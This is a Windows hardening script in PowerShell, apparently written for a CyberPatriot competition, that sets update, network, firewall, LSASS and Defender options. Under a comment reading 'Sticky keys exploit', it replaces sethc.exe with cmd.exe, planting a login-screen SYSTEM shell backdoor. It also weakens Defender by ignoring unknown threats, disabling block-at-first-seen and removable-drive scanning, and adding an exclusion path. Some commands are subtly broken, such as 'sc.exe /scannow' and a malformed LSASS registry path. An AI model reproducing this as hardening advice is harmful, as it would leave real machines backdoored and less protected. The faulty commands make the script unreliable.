#Must exist at the header of every single executable script!
Set-Location $args[1]
. .\__config.ps1 

function Set-MiscOptions
{
    if ($global:ScriptPlatform -eq "win16")
    {
        Install-WindowsFeature BitLocker -IncludeAllSubFeature -IncludeManagementTools
    }

    & bcdedit.exe '/set' '{current}' 'nx' 'AlwaysOn'
    & sc.exe '/scannow'

    & cmd.exe ".\ClearTasks.bat"

    #Sticky keys exploit
    & takeown.exe /f "C:\Windows\System32\sethc.exe"
    & takeown.exe /f "C:\Windows\System32\cmd.exe"
    & icacls.exe "C:\Windows\System32\sethc.exe" "/grant "$env:UserName":(f)"
    & icacls.exe "C:\Windows\System32\cmd.exe" "/grant "$env:UserName":(f)"
    try { Rename-Item -Path "C:\Windows\System32\sethc.exe" -NewName "C:\Windows\System32\sethc1.exe" -Force } catch { }
    try { Copy-Item -Path "C:\Windows\System32\cmd.exe" -Destination "C:\Windows\System32\sethc.exe" -Force } catch { }

    # Replace hosts file
    try { Copy-Item -Path ".\Data\hosts" -Destination "c:\windows\system32\drivers\etc\hosts" -Force } catch { }

    # Flush DNS
    & ipconfig.exe /flushdns

    # Flush ARP table
    & netsh.exe interface ip delete arpcache

    # Report sketchy processes
    Get-Process | Where-Object { $_.WorkingSet -gt 20000000 } > .\Checklist\Inspect-Processes.txt

    # Windows Updates (backup in case gp import is bad)
    reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AutoInstallMinorUpdates /t REG_DWORD /d 1 /f
    reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 0 /f
    reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 4 /f
    reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 4 /f
    reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 0 /f
    reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v ElevateNonAdmins /t REG_DWORD /d 0 /f
    reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWindowsUpdate /t REG_DWORD /d 0 /f
    reg.exe add "HKLM\SYSTEM\Internet Communication Management\Internet Communication" /v DisableWindowsUpdateAccess /t REG_DWORD /d 0 /f
    reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 0 /f

    # Record scheduled tasks
    Get-ScheduledTask | Where-Object state -EQ 'ready' | Get-ScheduledTaskInfo | Export-Csv -NoTypeInformation -Path ".\Checklist\Scheduled-tasks.txt"

    # Disable IPV6
    New-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Services\tcpip6\Parameters" -Name DisabledComponents -Value 0xff

    # Folder Options
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name Hidden -Value 1 -Force
    Set-ItemProperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideFileExt -Value 0 -Force
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name ShowSuperHidden -Value 1 -Force

    # Require a password on wakeup
    & powercfg.exe -SETACVALUEINDEX SCHEME_BALANCED SUB_NONE CONSOLELOCK 1

    # Disable IPV6 for all adapters
    Disable-NetAdapterBinding -Name "*" -ComponentID ms_tcpip6

    # Disable MSClient for all adapters
    Disable-NetAdapterBinding -Name "*" -ComponentID ms_msclient

    # Disable ipv6 ICMPredirects
    & netsh.exe interface ipv6 set global 'icmpredirects=disabled'

    # Set max hops to 64 by default. Prevents an infinite TTL packet.
    & netsh.exe interface ipv6 set global 'defaultcurhoplimit=64'

    #Disable ISATAP
    & netsh.exe interface ipv6 isatap set state disabled

    # Disable teredo
    & netsh.exe interface ipv6 set teredo 'type=disabled'

    # Disable 6to4
    & netsh.exe interface ipv6 6to4 set state disabled

    # Set default filetype associations for certain executable files
    & cmd.exe '/c' ftype 'htafile="%SystemRoot%\system32\NOTEPAD.EXE"' "%1"
    & cmd.exe '/c' ftype 'WSHFile="%SystemRoot%\system32\NOTEPAD.EXE"' "%1"
    & cmd.exe '/c' ftype 'batfile="%SystemRoot%\system32\NOTEPAD.EXE"' "%1"

    # Advanced MAPS reporting
    Set-MpPreference -MAPSReporting Advanced

    # Harden lsass to help protect against credential dumping (mimikatz)
    Set-ItemProperty -Path "HKLM:\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe" -Name AuditLevel -Value 8 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 1 -Force
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 0 -Force

    # Extra firewall rules for common programs that can be taken advantage of
    & Netsh.exe advfirewall firewall add rule name="Block Notepad.exe netconns" program="%systemroot%\system32\notepad.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block regsvr32.exe netconns" program="%systemroot%\system32\regsvr32.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block calc.exe netconns" program="%systemroot%\system32\calc.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block mshta.exe netconns" program="%systemroot%\system32\mshta.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block wscript.exe netconns" program="%systemroot%\system32\wscript.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block cscript.exe netconns" program="%systemroot%\system32\cscript.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'
    & Netsh.exe advfirewall firewall add rule name="Block runscripthelper.exe netconns" program="%systemroot%\system32\runscripthelper.exe" 'protocol=tcp' 'dir=out' 'enable=yes' 'action=block' 'profile=any'

    # Log dropped connections
    & netsh.exe advfirewall set currentprofile logging droppedconnections enable

    # Windows defender network protection
    Set-MpPreference -EnableNetworkProtection Enabled

    # Clear RAS credentials
    & cmdkey.exe /delete /ras

    # Clear Credman. Note: this may clear ssl cert :/
    & cmd.exe /c "For /F `"tokens=1,2 delims= `" %G in ('cmdkey /list ^| findstr Target') do cmdkey /delete %H"

    # Get windows defender exceptions
    $DefenderPrefs = Get-MpPreference;

    # Clear exclusion paths
    Foreach ($dpref in $DefenderPrefs.ExclusionPath)
    {
        Remove-MpPreference -Force -ExclusionPath $dpref
    }

    # Clear exclusion extensions
    Foreach ($dpref in $DefenderPrefs.ExclusionExtension)
    {
        Remove-MpPreference -Force -ExclusionExtension $dpref
    }

    # Clear exclusion processes
    Foreach ($dpref in $DefenderPrefs.ExclusionProcess)
    {
        Remove-MpPreference -Force -ExclusionProcess $dpref
    }
    
    # Dont kill cyberpatriot :)
    Add-MpPreference -Force -ExclusionPath "C:\CyberPatriot"

    # Enable defender to scan archives for malware
    Set-MpPreference -Force -DisableArchiveScanning $False 

    # Enable automatic exclusions (to prevent compatibility issues)
    Set-MpPreference -Force -DisableAutoExclusions $False

    # Allow behavior monitoring
    Set-MpPreference -Force -DisableBehaviorMonitoring $False

    # Disable block at first seen (so hopefully windefend ignores cypat's application)
    Set-MpPreference -Force -DisableBlockAtFirstSeen $True

    # Enable catchup scans (missed two scheduled, so we auto scan on login)
    Set-MpPreference -Force -DisableCatchupFullScan $False

    # Enable catchup quick scans
    Set-MpPreference -Force -DisableCatchupQuickScan $False

    # Enable email scanning
    Set-MpPreference -Force -DisableEmailScanning $False

    # Enable downloaded files scan
    Set-MpPreference -Force -DisableIOAVProtection $False

    # Enable IPS (network security)
    Set-MpPreference -Force -DisableIntrusionPreventionSystem $False

    # Enable privacy mode (only admins can see threat history)
    Set-MpPreference -Force -DisablePrivacyMode $False

    # Enable real time protection
    Set-MpPreference -Force -DisableRealtimeMonitoring $False

    # Dont scan removable drives (just for safety. Dont want windows defender yoinking scripts)
    Set-MpPreference -Force -DisableRemovableDriveScanning $True

    # Enable windows restore points
    Set-MpPreference -Force -DisableRestorePoint $False

    # Don't ignore scripts in our scan
    Set-MpPreference -Force -DisableScriptScanning $False

    # Always Quarantine threats
    Set-MpPreference -Force -HighThreatDefaultAction Quarantine
    Set-MpPreference -Force -ModerateThreatDefaultAction Quarantine
    Set-MpPreference -Force -LowThreatDefaultAction Quarantine

    # Enable potentially unwanted program detection
    Set-MpPreference -Force -PUAProtection Enabled

    # Automatically clear quarantined malware after 90 days
    Set-MpPreference -Force -QuarantinePurgeItemsAfterDelay 90

    # Scan both directions (inbound and outbound files)
    Set-MpPreference -Force -RealTimeScanDirection Both

    # Auto-remediate on sundays
    Set-MpPreference -Force -RemediationScheduleDay Sunday

    # Only allow 20% cpu for windows defender
    Set-MpPreference -Force -ScanAvgCPULoadFactor 20

    # Enable scanning, even while active
    Set-MpPreference -Force -ScanOnlyIfIdleEnabled $False

    # Ignore unknown threats simply because i dont want windows defender killing our tools
    Set-MpPreference -Force -UnknownThreatDefaultAction Ignore

    # Start windows defender scan in background
    Start-MpScan -AsJob

    # Disable netbios for all interfaces
    $Keys = $(Get-ChildItem -Path "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces");
    Foreach ($key in $Keys)
    {
        Set-ItemProperty $key.Name -Name NetbiosOptions -Value 2 -Force
    }

    # Disable LanMan Hosts file (another hosts file)
    Set-ItemProperty "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name EnableLMHosts -Value 0 -Force
}

try { Set-MiscOptions; } catch { Write-Error $_; }